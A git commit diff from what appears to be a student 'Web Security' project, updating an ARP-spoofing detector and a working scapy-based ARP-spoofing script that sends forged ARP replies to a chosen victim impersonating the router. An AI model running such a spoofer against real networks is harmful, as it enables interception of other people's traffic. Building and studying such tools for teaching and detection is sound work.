4cddbb656f20c79fe6f44722123dfffd7ddf12e5
Isaac <isahowayu4@gmail.com>
2024-06-30 20:02:59 -0600

    Versión final de ambos
    Un cambio no se sube hasta que funcione

--- detect_spoofing.py
+++ detect_spoofing.py
@@ -1,26 +1,55 @@
 from scapy.all import *
+import time
 import os
 
-def get_mac(ip):
-    try:
-        return getmacbyip(ip)
-    except:
-        return None
+# Obtiene la tabla ARP por medio de comandos
+def get_arp_table():
+    # Ejecutar el comando para obtener la tabla ARP
+    result = os.popen("arp -a").read().strip()
+    output = result.split('\n')
+    return output
 
-def check_arp_spoofing(router_ip, true_router_mac):
-    current_mac = get_mac(router_ip)
+# Extrae la MAC del resultado del comando cuando la IP coincide
+def extract_mac_from_arp(arp_table, router_ip):
+    # Buscar la línea de la tabla ARP correspondiente al router
+    for line in arp_table:
+        auxiliar = line.split()[1]
+        aux = str(auxiliar).replace('(', '').replace(')', '')
+        if router_ip == aux:
+            return line.split()[3]
+    return None
+
+# Obtiene la ip del router
+def get_router_ip_mac():
+    # Obtener la IP del router (gateway)
+    result = os.popen("ip route | grep default").read().strip()
+    router_ip = result.split()[2]
+    router_mac = extract_mac_from_arp(get_arp_table(), router_ip)
+    return router_ip, router_mac
+
+
+
+def check_arp_spoofing(true_router_mac):
+    router_ip, current_mac = get_router_ip_mac()
     
-    if current_mac is None:
-        print("No se puede obtener la dirección MAC actual del router")
+    if current_mac is None or router_ip is None:
+        print("No se puede obtener la dirección MAC o la IP actual del router")
         return
     
     if current_mac.lower() == true_router_mac.lower():
         print("La tabla ARP no ha sido modificada. La dirección MAC del router es correcta.")
     else:
         print("¡Advertencia! La tabla ARP ha sido modificada. La dirección MAC del router es incorrecta.")
-        print(f"MAC actual: {current_mac}, MAC esperada: {true_router_mac}")
+        print(f"IP del router: {router_ip}, MAC actual: {current_mac}, MAC esperada: {true_router_mac}")
 
 if __name__ == "__main__":
-    router_ip = input("Ingrese la IP del router: ")
     true_router_mac = input("Ingrese la dirección MAC verdadera del router: ")
-    check_arp_spoofing(router_ip, true_router_mac)
+    # Hace un loop eterno en el que analiza si hay modificaciones en el ARP
+    while True:
+        router_ip, current_mac = get_router_ip_mac()
+        
+        if current_mac is None or router_ip is None:
+            print("No se puede obtener la dirección MAC o la IP actual del router")
+        else:
+            check_arp_spoofing(true_router_mac)
+        time.sleep(2)
--- spoofing.py
+++ spoofing.py
@@ -3,23 +3,46 @@
     Materia: Web Security
 """
 
-import scrapy
+import scapy.all as scapy 
+import time 
+  
+# Obtiene la MAC con la librería scapy  
+def get_mac(ip): 
+    arp_request = scapy.ARP(pdst = ip) 
+    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
+    arp_request_broadcast = broadcast / arp_request 
+    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        return None
 
-def arp_spoof(victim_ip, router_ip):
-    victim_mac = getmacbyip(victim_ip)
-    router_mac = getmacbyip(router_ip)
-    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, op='is-at')
-
-    print(f"Enviando paquetes ARP a {victim_ip} para suplantar al router {router_ip}")
-    
-    try:
-        while True:
-            send(arp_response, verbose=0)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("Deteniendo ARP Spoofing")
-
+# Prepara el paquete para la víctima
+def spoofing(victim_ip, router_ip): 
+    packet = scapy.ARP(op = 2, pdst = victim_ip, hwdst = get_mac(victim_ip), 
+                                                            psrc = router_ip) 
+    scapy.send(packet, verbose = False) 
+  
+# Función importante para restaurar la MAC
+def restore(destination_ip, source_ip): 
+    destination_mac = get_mac(destination_ip) 
+    #print(destination_mac)
+    source_mac = get_mac(source_ip) 
+    #print(source_mac)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
+    scapy.send(packet, verbose = False) 
+  
 if __name__ == "__main__":
     victim_ip = input("Ingrese la IP de la máquina víctima: ")
     router_ip = input("Ingrese la IP del router: ")
-    arp_spoof(victim_ip, router_ip)
+    try: 
+        sent_packets_count = 0
+        while True: 
+            spoofing(victim_ip, router_ip) 
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Paquetes enviados "+str(sent_packets_count), end ="") 
+            time.sleep(2)
+  
+    except KeyboardInterrupt: 
+        restore(router_ip, victim_ip) 
+        print("[+] ARP detenido") 
